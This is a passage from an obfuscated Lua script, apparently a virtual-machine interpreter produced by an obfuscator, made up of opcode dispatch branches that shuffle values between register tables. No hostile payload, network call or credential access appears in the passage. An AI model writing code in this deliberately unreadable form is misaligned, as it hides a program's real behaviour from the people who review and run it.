bd;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];bd=y[870]bb,bc=i(w[bd](r(w,bd+1,y[312])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif 128>=z then if z<=126 then w[y[870]]=w[y[312]];elseif 127<z then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=129 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+y[716];n=n+1;y=f[n];h[y[312]]=w[y[870]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]();elseif z>130 then local ba;w[y[870]]=w[y[312]]%w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+y[716];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];bc=y[312];bb=y[716];ba=k(w,g,bc,bb);w[y[870]]=ba;end;elseif 137>=z then if 134>=z then if 132>=z then local ba=w[y[716]];if not ba then n=(n+1);else w[y[870]]=ba;n=y[312];end;elseif 133<z then w[y[870]]=w[y[312]]/y[716];else local ba;local bb,bc;local bd;w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];bd=y[870]bb,bc=i(w[bd](r(w,bd+1,y[312])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif 135>=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif 137>z then w[y[870]]=w[y[312]]+y[716];else w[y[870]]={};end;elseif z<=140 then if 138>=z then w[y[870]]=b(d[y[312]],nil,j);elseif z>139 then local ba;local bb;local bc;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];bc=y[312];bb=y[716];ba=k(w,g,bc,bb);w[y[870]]=ba;else local ba;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba]()end;elseif 141>=z then local ba;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];ba=y[870]w[ba](r(w,ba+1,y[312]))elseif z~=143 then local ba;w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba=y[870]w[ba](w[ba+1])end;elseif 167>=z then if 155>=z then if z<=149 then if z<=146 then if z<=144 then w[y[870]]=y[312];elseif not(146==z)then local ba=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then a(c,e);else n=n+1;end else if 2==ba then y=f[n];else w={};end end else if ba<=5 then if 5~=ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end else if ba<=6 then y=f[n];else if 7<ba then n=n+1;else w[y[870]]=y[312];end end end end else if ba<=12 then if ba<=10 then if 9==ba then y=f[n];else w[y[870]]=j[y[312]];end else if 12>ba then n=n+1;else y=f[n];end end else if ba<=14 then if ba==13 then w[y[870]]=j[y[312]];else n=n+1;end else if ba<=15 then y=f[n];else if 16<ba then break else w[y[870]]=w[y[312]][y[716]];end end end end end ba=ba+1 end else if(not(w[y[870]]==w[y[716]]))then n=n+1;else n=y[312];end;end;elseif z<=147 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end elseif 149~=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba]()else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=152 then if(150==z or 150>z)then n=y[312];elseif z~=152 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[870]]=j[y[312]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 4<ba then n=n+1;else w[y[870]]=y[312];end else if ba~=7 then y=f[n];else w[y[870]]=w[y[312]][w[y[716]]];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if ba==10 then w[y[870]]=w[y[312]];else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else bb=y[870]end else if ba==14 then w[bb]=w[bb](w[bb+1])else break end end end end ba=ba+1 end else w[y[870]]=(y[312]*w[y[716]]);end;elseif z<=153 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end elseif z<155 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba]()else local ba=y[870]local bb,bc=i(w[ba](r(w,ba+1,y[312])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;end;elseif z<=161 then if z<=158 then if 156>=z then local ba=y[870];local bb=w[ba];for bc=(ba+1),p do t(bb,w[bc])end;elseif 158>z then w[y[870]]=(not w[y[312]]);else local ba;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba]()end;elseif z<=159 then if(w[y[870]]~=w[y[716]])then n=n+1;else n=y[312];end;elseif 161~=z then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end end;elseif 164>=z then if 162>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w[y[870]]=j[y[312]];else bb=nil end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[870]]=w[y[312]][y[716]];end else if ba<=6 then y=f[n];else if ba<8 then w[y[870]]=y[312];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[870]]=y[312];end else if ba<=11 then n=n+1;else if ba<13 then y=f[n];else w[y[870]]=y[312];end end end else if ba<=15 then if ba==14 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[870]else if ba~=18 then w[bb]=w[bb](r(w,bb+1,y[312]))else break end end end end end ba=ba+1 end elseif z~=164 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=false;n=n+1;y=f[n];ba=y[870]w[ba](w[ba+1])else local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=165 then w[y[870]]=w[y[312]];elseif 167~=z then local ba;w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];ba=y[870]w[ba](r(w,ba+1,y[312]))else w[y[870]]=w[y[312]]-y[716];end;elseif 179>=z then if z<=173 then if z<=170 then if z<=168 then local ba=y[870]local bb,bc=i(w[ba](r(w,ba+1,y[312])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif 169<z then local ba;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];end;elseif z<=171 then local ba=y[870];local bb=y[716];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[312];else n=n+1 end;elseif 172<z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870];do return w[ba](r(w,ba+1,y[312]))end;n=n+1;y=f[n];ba=y[870];do return r(w,ba,p)end;n=n+1;y=f[n];n=y[312];else local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=176 then if z<=174 then local ba;w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif z<176 then w[y[870]]=false;n=n+1;else w[y[870]][y[312]]=w[y[716]];end;elseif 177>=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif z<179 then local ba=y[870]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else w[y[870]]();end;elseif z<=185 then if z<=182 then if z<=180 then if w[y[870]]then n=n+1;else n=y[312];end;elseif z~=182 then local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba=y[870]local bb={w[ba](r(w,ba+1,y[312]))};local bc=0;for bd=ba,y[716]do bc=bc+1;w[bd]=bb[bc];end;end;elseif z<=183 then w[y[870]][y[312]]=w[y[716]];elseif 185>z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if(w[y[870]]~=w[y[716]])then n=n+1;else n=y[312];end;else local ba=y[870]w[ba]=w[ba](w[ba+1])end;elseif 188>=z then if z<=186 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end elseif 188>z then local ba;local bb;local bc;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];bc=y[312];bb=y[716];ba=k(w,g,bc,bb);w[y[870]]=ba;else local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=189 then w[y[870]]=w[y[312]]%y[716];elseif z>190 then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870];do return w[ba](r(w,ba+1,y[312]))end;n=n+1;y=f[n];ba=y[870];do return r(w,ba,p)end;end;elseif z<=287 then if 239>=z then if 215>=z then if 203>=z then if z<=197 then if 194>=z then if 192>=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif 193==z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;else w[y[870]]=w[y[312]][y[716]];end;elseif 195>=z then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end elseif z==196 then if not w[y[870]]then n=n+1;else n=y[312];end;else local ba;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=200 then if z<=198 then w[y[870]]=j[y[312]];elseif z>199 then local ba=y[870]w[ba]=w[ba]()else w[y[870]]=w[y[312]]+w[y[716]];end;elseif 201>=z then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba>0 then w={};else bb=nil end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if 4~=ba then n=n+1;else y=f[n];end end end else if ba<=7 then if ba<=5 then w[y[870]]=h[y[312]];else if ba~=7 then n=n+1;else y=f[n];end end else if ba<=8 then w[y[870]]=w[y[312]][y[716]];else if 10~=ba then n=n+1;else y=f[n];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then w[y[870]]=h[y[312]];else if ba==12 then n=n+1;else y=f[n];end end else if ba<=14 then w[y[870]]=h[y[312]];else if ba<16 then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[870]]=w[y[312]][w[y[716]]];else if 19~=ba then n=n+1;else y=f[n];end end else if ba<=20 then bb=y[870]else if ba>21 then break else w[bb](w[bb+1])end end end end end ba=ba+1 end elseif 203~=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];if(w[y[870]]~=y[716])then n=n+1;else n=y[312];end;else w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];for ba=y[870],y[312],1 do w[ba]=nil;end;end;elseif z<=209 then if 206>=z then if z<=204 then local ba=y[870];local bb=w[y[312]];w[ba+1]=bb;w[ba]=bb[w[y[716]]];elseif z==205 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else h[y[312]]=w[y[870]];end;elseif z<=207 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end elseif 209~=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba]()else local ba;w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=212 then if 210>=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif 211<z then local ba=y[870]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else do return w[y[870]]end end;elseif z<=213 then local ba;local bb;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={r({},1,y[312])};n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];bb=y[870];ba=w[bb];for bc=bb+1,y[312]do t(ba,w[bc])end;elseif z>214 then local ba=y[870]w[ba](r(w,ba+1,p))else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=227 then if 221>=z then if 218>=z then if 216>=z then w[y[870]]={r({},1,y[312])};elseif 218~=z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if(w[y[870]]~=w[y[716]])then n=n+1;else n=y[312];end;else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;end;elseif z<=219 then if(y[870]==w[y[716]]or y[870]<w[y[716]])then n=(n+1);else n=y[312];end;elseif 221~=z then local ba;local bb;local 